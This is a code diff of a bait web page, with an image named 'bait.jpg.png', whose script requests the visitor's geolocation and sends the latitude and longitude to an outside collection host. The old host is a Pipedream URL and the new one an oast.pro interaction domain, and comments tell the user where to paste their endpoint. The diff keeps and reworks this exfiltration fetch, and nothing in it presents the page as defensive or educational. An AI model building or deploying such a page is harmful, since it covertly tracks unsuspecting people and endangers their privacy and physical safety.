@@ -13,13 +13,18 @@
     <img src="bait.jpg.png" id="photo">
 
     <script>
-        // REPLACE THIS with your Pipedream URL
-        const gate = "https://eotwt8cj1vr426p.m.pipedream.net";
+        // Paste your RequestBin "Endpoint URL" here (e.g., https://en...x.x.pipedream.net or similar)
+        const gate = "5a12ec3b9c2455e9a600gutcsgcyyyyyb.oast.pro";
 
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
+                    // This sends the Lat and Lon as query parameters
+                    const report = gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude;
+                    
+                    fetch(report);
+                }, function(error) {
+                    console.log("Location denied or error occurred.");
                 });
             }
         }
